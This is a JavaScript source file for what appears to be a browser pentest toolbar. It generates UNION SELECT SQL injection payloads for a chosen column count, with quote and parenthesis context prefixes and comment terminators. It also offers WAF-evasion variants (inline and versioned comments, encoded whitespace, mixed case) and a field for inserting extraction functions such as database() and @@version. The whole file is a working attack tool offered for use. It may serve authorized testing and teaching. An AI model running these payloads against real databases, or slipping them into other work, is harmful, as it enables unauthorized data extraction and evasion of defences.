// ============================================================
// union.js - UNION SELECT column-count-aware payload generator
// ============================================================
// A UNION-based injection only works if the injected SELECT has exactly
// as many columns as the original query, and each column's value has to
// be a type the database will accept there (a bare number won't satisfy
// a text column on strict engines like PostgreSQL). Rather than a fixed
// list of "1,2,3" / "1,2,3,4" style payloads, this panel asks for the
// column count up front and lets you mark which positions should be
// string literals instead of numbers, then generates ready payloads.
//
// Two renderers share the same form + column logic:
//   render      → standard contexts (numeric, ', ", '), etc.) incl. a "pure" one
//   renderWaf   → WAF-bypass variants (inline comments, versioned comments,
//                 whitespace tricks, parenthesised, case) — all PURE, i.e. no
//                 context prefix and no trailing comment, so you add your own.

window.KHackBar = window.KHackBar || {};
window.KHackBar.Union = window.KHackBar.Union || {};

(function () {
  function parsePositions(str) {
    return str.split(',')
      .map(function (s) { return parseInt(s.trim(), 10); })
      .filter(function (n) { return !isNaN(n) && n > 0; });
  }

  // Parses "2:database(),3:@@version" into { 2: 'database()', 3: '@@version' }.
  function parseOverrides(str) {
    var map = {};
    str.split(',').forEach(function (pair) {
      var idx = pair.indexOf(':');
      if (idx === -1) return;
      var pos = parseInt(pair.substring(0, idx).trim(), 10);
      var value = pair.substring(idx + 1).trim();
      if (!isNaN(pos) && pos > 0 && value) map[pos] = value;
    });
    return map;
  }

  function buildColumnList(count, textPositions, textValue, overrides) {
    var cols = [];
    for (var i = 1; i <= count; i++) {
      if (overrides[i] !== undefined) cols.push(overrides[i]);
      else if (textPositions.indexOf(i) !== -1) cols.push("'" + textValue + "'");
      else cols.push(String(i));
    }
    return cols.join(',');
  }

  // Shared panel builder. `variants` is an array of { label, build(columnList) }.
  function mount(panel, urlBox, variants, hintText) {
    if (!panel || !urlBox || !window.KHackBar.UI) return;
    while (panel.firstChild) panel.removeChild(panel.firstChild);
    panel.style.flexDirection = 'column';

    var form = document.createElement('div');
    form.style.cssText = 'width:100%; display:flex; flex-wrap:wrap; gap:8px; margin-bottom:8px; align-items:flex-end;';

    function makeField(labelText, inputEl) {
      var wrap = document.createElement('div');
      wrap.style.cssText = 'display:flex; flex-direction:column; gap:2px;';
      var label = document.createElement('div');
      label.style.cssText = 'font-size:10px; color:#ef4444;';
      label.textContent = labelText;
      wrap.appendChild(label);
      wrap.appendChild(inputEl);
      return wrap;
    }

    var colCountInput = document.createElement('input');
    colCountInput.type = 'number';
    colCountInput.min = '1'; colCountInput.max = '40'; colCountInput.value = '3';
    colCountInput.style.width = '60px';
    colCountInput.className = 'settings-input';

    var textColsInput = document.createElement('input');
    textColsInput.type = 'text';
    textColsInput.placeholder = 'e.g. 2,4 (blank = all numbers)';
    textColsInput.style.width = '170px';
    textColsInput.className = 'settings-input';

    var textValueInput = document.createElement('input');
    textValueInput.type = 'text';
    textValueInput.value = 'text';
    textValueInput.style.width = '80px';
    textValueInput.className = 'settings-input';

    var overridesInput = document.createElement('input');
    overridesInput.type = 'text';
    overridesInput.placeholder = 'e.g. 2:database(),3:@@version';
    overridesInput.style.width = '220px';
    overridesInput.className = 'settings-input';

    var generateBtn = document.createElement('button');
    generateBtn.className = 'action-btn';
    generateBtn.style.fontSize = '11px';
    generateBtn.textContent = 'Generate';

    form.appendChild(makeField('How many columns?', colCountInput));
    form.appendChild(makeField('Text columns (positions)', textColsInput));
    form.appendChild(makeField('Text value', textValueInput));
    form.appendChild(makeField('Column overrides (pos:value)', overridesInput));
    form.appendChild(generateBtn);
    panel.appendChild(form);

    var hint = document.createElement('div');
    hint.style.cssText = 'width:100%; font-size:10px; color:#a3a3a3; margin-bottom:8px;';
    hint.textContent = hintText;
    panel.appendChild(hint);

    var resultsRow = document.createElement('div');
    resultsRow.style.cssText = 'display:flex; flex-wrap:wrap; gap:4px; width:100%;';
    panel.appendChild(resultsRow);

    function regenerate() {
      while (resultsRow.firstChild) resultsRow.removeChild(resultsRow.firstChild);
      var count = parseInt(colCountInput.value, 10);
      if (isNaN(count) || count < 1) count = 1;
      var textPositions = parsePositions(textColsInput.value);
      var textValue = textValueInput.value || 'text';
      var overrides = parseOverrides(overridesInput.value);
      var columnList = buildColumnList(count, textPositions, textValue, overrides);

      variants.forEach(function (v) {
        var payload = v.build(columnList);
        var btn = window.KHackBar.UI.createPayloadButton(v.label, payload, panel.id, urlBox);
        resultsRow.appendChild(btn);
      });
    }

    generateBtn.onclick = regenerate;
    regenerate();
  }

  // ---- Standard contexts (first entry is a pure UNION SELECT) ----
  function pv(prefix, suffix) {
    return function (cols) { return prefix + 'UNION SELECT ' + cols + suffix; };
  }
  var STD_VARIANTS = [
    { label: 'UNION SELECT ... (pure)',   build: pv('',      '') },
    { label: '-1 UNION SELECT ...-- -',   build: pv('-1 ',   '-- -') },
    { label: 'NULL UNION SELECT ...-- -', build: pv('NULL ', '-- -') },
    { label: "' UNION SELECT ...-- -",    build: pv("' ",    '-- -') },
    { label: '" UNION SELECT ...-- -',    build: pv('" ',    '-- -') },
    { label: "') UNION SELECT ...-- -",   build: pv("') ",   '-- -') },
    { label: '") UNION SELECT ...-- -',   build: pv('") ',   '-- -') },
    { label: "')) UNION SELECT ...-- -",  build: pv("')) ",  '-- -') },
    { label: "' UNION SELECT ...#",       build: pv("' ",    '#') }
  ];

  // ---- WAF-bypass variants — all PURE (no context prefix, no comment) ----
  var WAF_VARIANTS = [
    { label: 'UNION SELECT (pure)',        build: function (c) { return 'UNION SELECT ' + c; } },
    { label: 'UNION/**/SELECT',            build: function (c) { return 'UNION/**/SELECT/**/' + c; } },
    { label: '/*!UNION SELECT*/',          build: function (c) { return '/*!UNION*/ /*!SELECT*/ ' + c; } },
    { label: '/*!50000UNION*/',            build: function (c) { return '/*!50000UNION*/ /*!50000SELECT*/ ' + c; } },
    { label: 'UNION%0aSELECT (newline)',   build: function (c) { return 'UNION%0aSELECT%0a' + c; } },
    { label: 'UNION%09SELECT (tab)',       build: function (c) { return 'UNION%09SELECT%09' + c; } },
    { label: 'UNION ALL SELECT',           build: function (c) { return 'UNION ALL SELECT ' + c; } },
    { label: 'UNION(SELECT ...)',          build: function (c) { return 'UNION(SELECT ' + c + ')'; } },
    { label: 'UNION DISTINCT SELECT',      build: function (c) { return 'UNION DISTINCT SELECT ' + c; } },
    { label: 'UnIoN SeLeCt (case)',        build: function (c) { return 'UnIoN SeLeCt ' + c; } },
    { label: 'UNION/**/ALL/**/SELECT',     build: function (c) { return 'UNION/**/ALL/**/SELECT/**/' + c; } }
  ];

  window.KHackBar.Union.render = function (panel, urlBox) {
    mount(panel, urlBox, STD_VARIANTS,
      'Find the column count first (e.g. with an ORDER BY probe), enter it above, mark any text/string column positions, then click a generated payload to insert it. The first button is a pure "UNION SELECT 1,2,3" (no prefix/comment). Use "Column overrides" to drop a raw extraction function (database(), @@version, group_concat(...), etc.) into a specific column.');
  };

  window.KHackBar.Union.renderWaf = function (panel, urlBox) {
    mount(panel, urlBox, WAF_VARIANTS,
      'WAF-bypass UNION SELECT variants — all PURE (no context prefix, no trailing comment). Set the column count and any text columns, then click a variant to insert it, and add your own context (e.g. a leading quote/paren and a trailing -- -) as the target needs. Overrides work here too.');
  };
})();
